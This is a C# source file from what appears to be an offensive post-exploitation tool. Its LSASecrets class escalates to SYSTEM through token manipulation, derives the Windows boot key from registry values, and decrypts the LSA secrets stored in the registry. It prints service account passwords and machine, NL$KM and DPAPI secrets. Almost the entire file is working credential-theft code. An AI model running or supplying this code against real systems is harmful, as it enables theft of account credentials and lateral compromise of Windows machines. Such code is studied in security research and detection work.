using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;

namespace WheresMyImplant
{
    class LSASecrets : Base
    {
        public Boolean bailOut = false;

        public LSASecrets()
        {
            ////////////////////////////////////////////////////////////////////////////////
            //
            ////////////////////////////////////////////////////////////////////////////////
            if (!WindowsIdentity.GetCurrent().IsSystem)
            {
                WriteOutputBad("Not running as SYSTEM, checking for Administrator access.");
                if ((new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
                {
                    WriteOutputBad("Not running as Administrator, Exiting.");
                    bailOut = true;
                }
                else
                {
                    Tokens tokenvator = new Tokens();
                    tokenvator.GetSystem();
                    if (!WindowsIdentity.GetCurrent().IsSystem)
                    {
                        WriteOutputBad("GetSystem Failed");
                        bailOut = true;
                        return;
                    }
                }
            }
            WriteOutputGood("Running as SYSTEM");
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public void DumpLSASecrets()
        {
            WriteOutputNeutral("Reading Secrets Key: SECURITY\\Policy\\Secrets");
            String[] secretSubKeys = Registry.LocalMachine.OpenSubKey(@"SECURITY\Policy\Secrets").GetSubKeyNames();
            if (secretSubKeys.Length <= 0)
            {
                WriteOutputBad("[-] Reading Secrets key failed");
                return;
            }

            Byte[] bootKey = GetBootKey();
            WriteOutputGood("[+] BootKey : " + BitConverter.ToString(bootKey));
            Byte[] polEKList = (Byte[])Reg.ReadRegKey(Reg.HKEY_LOCAL_MACHINE, @"SECURITY\Policy\PolEKList", "");
            Byte[] lsaKey = DecryptLsa(polEKList, bootKey);
            lsaKey = lsaKey.Skip(68).Take(32).ToArray();

            foreach (String secret in secretSubKeys)
            {
                Byte[] managedArray = (Byte[])Reg.ReadRegKey(Reg.HKEY_LOCAL_MACHINE, @"SECURITY\Policy\Secrets\" + secret + "\\CurrVal", "");
                Byte[] decryptedSecret = DecryptLsa(managedArray, lsaKey);

                String serviceName = "";
                String userName = "";
                String password = "";
                if (secret == "$MACHINE.ACC" || secret == "NL$KM" || secret == "DPAPI_SYSTEM")
                {
                    serviceName = secret;
                    password = BitConverter.ToString(decryptedSecret.Skip(16).Take((Int32)decryptedSecret[0]).ToArray());
                }
                else if (secret.Substring(0, 4) == "_SC_")
                {
                    serviceName = secret.Substring(4, secret.Length - 4);
                    userName = (String)Reg.ReadRegKey(Reg.HKEY_LOCAL_MACHINE, @"SYSTEM\CurrentControlSet\Services\" + serviceName, "ObjectName");
                    password = ParseDecrypted(decryptedSecret);
                }
                else
                {
                    serviceName = secret;
                    password = ParseDecrypted(decryptedSecret);
                }
                String result = String.Format("{0,-30} {1,-20} {2,-20}\n", serviceName, userName, password);
                WriteOutputGood(result);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public static String ParseDecrypted(Byte[] decryptedString)
        {
            Console.WriteLine((Int32)decryptedString[0]);
            Byte[] passwordText = decryptedString.Skip(16).Take((Int32)decryptedString[0]).ToArray();
            String password = Encoding.Unicode.GetString(passwordText);
            if (password.Length == 0)
            {
                return "<blank_password>";
            }
            else
            {
                return password;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //https://social.msdn.microsoft.com/Forums/vstudio/en-US/d490653d-479c-4a40-90ff-76870309c801/remove-nonprintable-characters-from-a-string?forum=csharpgeneral
        ////////////////////////////////////////////////////////////////////////////////
        public static String RemoveNonPrintableCharacters(String s)
        {
            StringBuilder result = new StringBuilder();
            for (Int32 i = 0; i < s.Length; i++)
            {
                Char c = s[i];
                Byte b = (Byte)c;
                if (b < 32)
                    result.Append("");
                else if (b > 126)
                    result.Append("");
                else
                    result.Append(c);
            }
            return result.ToString();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public static Byte[] DecryptLsa(Byte[] secret, Byte[] key)
        {
            Byte[] combinedKey = key;
            Byte[] splicedSecret = secret.Skip(28).Take(32).ToArray();

            Byte[] hash;
            using (SHA256 sha256 = new SHA256Managed())
            {
                for (Int32 i = 0; i < 1000; i++)
                {
                    combinedKey = Misc.combine(combinedKey, splicedSecret);
                }
                hash = sha256.ComputeHash(combinedKey);
            }

            Byte[] plaintextSecret = new Byte[0];
            for (Int32 i = 60; i < secret.Length; i += 16)
            {
                using (Aes aes = new AesManaged())
                {
                    aes.Key = hash;
                    aes.Mode = CipherMode.CBC;
                    aes.IV = new Byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };
                    aes.Padding = PaddingMode.Zeros;
                    ICryptoTransform decryptor = aes.CreateDecryptor();
                    plaintextSecret = Misc.combine(plaintextSecret, decryptor.TransformFinalBlock(secret, i, 16));
                }
            }
            return plaintextSecret;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public static Byte[] GetBootKey()
        {
            //Int32[] permutationMatrix = { 0x0b, 0x06, 0x07, 0x01, 0x08, 0x0a, 0x0e, 0x00, 0x03, 0x05, 0x02, 0x0f, 0x0d, 0x09, 0x0c, 0x04 };
            Int32[] permutationMatrix = { 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 };

            StringBuilder sbBootKey = new StringBuilder();
            sbBootKey.Append((String)Reg.ReadRegKeyInfo(Reg.HKEY_LOCAL_MACHINE, @"SYSTEM\CurrentControlSet\Control\Lsa\JD"));
            sbBootKey.Append((String)Reg.ReadRegKeyInfo(Reg.HKEY_LOCAL_MACHINE, @"SYSTEM\CurrentControlSet\Control\Lsa\Skew1"));
            sbBootKey.Append((String)Reg.ReadRegKeyInfo(Reg.HKEY_LOCAL_MACHINE, @"SYSTEM\CurrentControlSet\Control\Lsa\GBG"));
            sbBootKey.Append((String)Reg.ReadRegKeyInfo(Reg.HKEY_LOCAL_MACHINE, @"SYSTEM\CurrentControlSet\Control\Lsa\Data"));

            Byte[] bootKey = new Byte[sbBootKey.Length/2];
            Int32 j = 0;
            for (Int32 i = 0; i < sbBootKey.Length; i+=2)
            {
                String temp = sbBootKey[i].ToString() + sbBootKey[i+1].ToString();
                bootKey[j++] = Convert.ToByte(temp, 16);
            }

            Byte[] bootKeyPermutation = new Byte[bootKey.Length];
            for(Int32 i = 0; i < bootKey.Length; i++)
            {
                bootKeyPermutation[i] = bootKey[permutationMatrix[i]];
            }
            return bootKeyPermutation;
        }
    }
}
